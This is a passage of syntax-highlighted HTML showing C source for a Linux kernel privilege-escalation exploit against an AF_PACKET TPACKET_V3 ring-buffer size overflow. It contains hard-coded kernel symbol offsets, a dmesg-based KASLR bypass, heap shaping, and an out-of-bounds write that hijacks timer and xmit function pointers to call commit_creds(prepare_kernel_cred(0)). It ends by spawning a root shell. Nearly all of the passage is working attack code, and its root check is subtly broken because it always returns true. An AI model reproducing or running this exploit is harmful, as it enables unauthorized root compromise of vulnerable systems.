class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENABLE_KASLR_BYPASS0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENABLE_SMEP_SMAP_BYPASS0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Will be overwritten if ENABLE_KASLR_BYPASS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> KERNEL_BASE = <span class="number">0xffffffff81000000</span>ul;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kernel symbol offsets</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS0x8db30ul</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED0x8df60ul</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NATIVE_WRITE_CR40x301f0ul</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Should have SMEP and SMAP bits disabled</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CR4_DESIRED_VALUE0x407f0ul</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_PAD512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGEALLOC_PAD1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ pahole -C hlist_node ./vmlinux</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *        <span class="title">next</span>;</span>                 <span class="comment">/*     0     8 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> * *      <span class="title">pprev</span>;</span>                <span class="comment">/*     8     8 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ pahole -C timer_list ./vmlinux</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>          <span class="title">entry</span>;</span>                <span class="comment">/*     0    16 */</span></span><br><span class="line"><span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>          expires;              <span class="comment">/*    16     8 */</span></span><br><span class="line"><span class="type">void</span>                       (*function)(<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>); <span class="comment">/*    24     8 */</span></span><br><span class="line"><span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>          data;                 <span class="comment">/*    32     8 */</span></span><br><span class="line">u32                        flags;                <span class="comment">/*    40     4 */</span></span><br><span class="line"><span class="type">int</span>                        start_pid;            <span class="comment">/*    44     4 */</span></span><br><span class="line"><span class="type">void</span> *                     start_site;           <span class="comment">/*    48     8 */</span></span><br><span class="line"><span class="type">char</span>                       start_comm[<span class="number">16</span>];       <span class="comment">/*    56    16 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// packet_sock-&gt;rx_ring-&gt;prb_bdqc-&gt;retire_blk_timer</span></span><br><span class="line"><span class="comment">// #define TIMER_OFFSET896</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMER_OFFSET880</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pakcet_sock-&gt;xmit</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XMIT_OFFSET1304</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="type">int</span> v = TPACKET_V3;</span><br><span class="line"><span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">req.tp_block_size = block_size;</span><br><span class="line">req.tp_frame_size = frame_size;</span><br><span class="line">req.tp_block_nr = block_nr;</span><br><span class="line">req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">req.tp_retire_blk_tov = timeout;</span><br><span class="line">req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line"><span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_family = PF_PACKET;</span><br><span class="line">sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line"><span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LENsizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LENsizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LENsizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_SIZE 0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line">SLAB_SIZE - BLK_HDR_LEN - macoff + offset;</span><br><span class="line"><span class="keyword">return</span> packet_socket_setup(SLAB_SIZE, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_timer_execute</span><span class="params">(<span class="type">void</span> *func, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">oob_setup(<span class="number">2048</span> + TIMER_OFFSET - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;oob setup finished\\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> timer = packet_sock_kmalloc();</span><br><span class="line">packet_sock_timer_schedule(timer, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(&amp;buffer[<span class="number">0</span>], <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> *<span class="title">timer</span> =</span> (<span class="keyword">struct</span> timer_list *)&amp;buffer[<span class="number">8</span>];</span><br><span class="line">timer-&gt;function = func;</span><br><span class="line">timer-&gt;data = arg;</span><br><span class="line">timer-&gt;flags = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">oob_write(&amp;buffer[<span class="number">0</span>] + <span class="number">2</span>, <span class="keyword">sizeof</span>(*timer) + <span class="number">8</span> - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_id_match_execute</span><span class="params">(<span class="type">void</span> *func)</span> &#123;</span><br><span class="line"><span class="type">int</span> s = oob_setup(<span class="number">2048</span> + XMIT_OFFSET - <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ps[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">ps[i] = packet_sock_kmalloc();</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(&amp;buffer[<span class="number">0</span>], <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> **xmit = (<span class="type">void</span> **)&amp;buffer[<span class="number">64</span>];</span><br><span class="line">*xmit = func;</span><br><span class="line"></span><br><span class="line">oob_write((<span class="type">char</span> *)&amp;buffer[<span class="number">0</span>] + <span class="number">2</span>, <span class="keyword">sizeof</span>(*xmit) + <span class="number">64</span> - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;oob write finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">packet_sock_id_match_trigger(ps[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">packet_socket_setup(SLAB_SIZE, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_payload</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(</span><br><span class="line">((_prepare_kernel_cred)(KERNEL_BASE + PREPARE_KERNEL_CRED))(<span class="number">0</span>)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * Simple KASLR bypass * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSLOG_ACTION_READ_ALL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSLOG_ACTION_SIZE_BUFFER 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">get_kernel_addr</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (size == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size = (size / getpagesize() + <span class="number">1</span>) * getpagesize();</span><br><span class="line"><span class="type">char</span> *buffer = (<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, size, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">size = klogctl(SYSLOG_ACTION_READ_ALL, &amp;buffer[<span class="number">0</span>], size);</span><br><span class="line"><span class="keyword">if</span> (size == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] klogctl(SYSLOG_ACTION_READ_ALL)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *needle1 = <span class="string">&quot;Freeing SMP&quot;</span>;</span><br><span class="line"><span class="type">char</span> *substr = (<span class="type">char</span> *)memmem(&amp;buffer[<span class="number">0</span>], size, needle1, <span class="built_in">strlen</span>(needle1));</span><br><span class="line"><span class="keyword">if</span> (substr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] substring &#x27;%s&#x27; not found in dmesg\\n&quot;</span>, needle1);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (size = <span class="number">0</span>; substr[size] != <span class="string">&#x27;\\n&#x27;</span>; size++);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *needle2 = <span class="string">&quot;ffff&quot;</span>;</span><br><span class="line">substr = (<span class="type">char</span> *)memmem(&amp;substr[<span class="number">0</span>], size, needle2, <span class="built_in">strlen</span>(needle2));</span><br><span class="line"><span class="keyword">if</span> (substr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] substring &#x27;%s&#x27; not found in dmesg\\n&quot;</span>, needle2);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *endptr = &amp;substr[<span class="number">16</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r = strtoul(&amp;substr[<span class="number">0</span>], &amp;endptr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">r &amp;= <span class="number">0xfffffffffff00000</span>ul;</span><br><span class="line">r -= <span class="number">0x1000000</span>ul;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exec_shell</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *shell = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *args[] = &#123;shell, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fork_shell</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">pid_t</span> rv;</span><br><span class="line"></span><br><span class="line">rv = fork();</span><br><span class="line"><span class="keyword">if</span> (rv == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] fork()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rv == <span class="number">0</span>) &#123;</span><br><span class="line">exec_shell();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_root</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// We can&#x27;t simple check uid, since we&#x27;re running inside a namespace</span></span><br><span class="line"><span class="comment">// with uid set to 0. Try opening /etc/shadow instead.</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/etc/shadow&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_root</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] checking if we got root\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_root()) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] something went wrong =(\\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] got r00t ^_^\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fork and exec instead of just doing the exec to avoid potential</span></span><br><span class="line"><span class="comment">// memory corruptions when closing packet sockets.</span></span><br><span class="line">fork_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">va_list args;</span><br><span class="line">va_start(args, what);</span><br><span class="line">vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">va_end(args);</span><br><span class="line">buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> real_uid = getuid();</span><br><span class="line"><span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 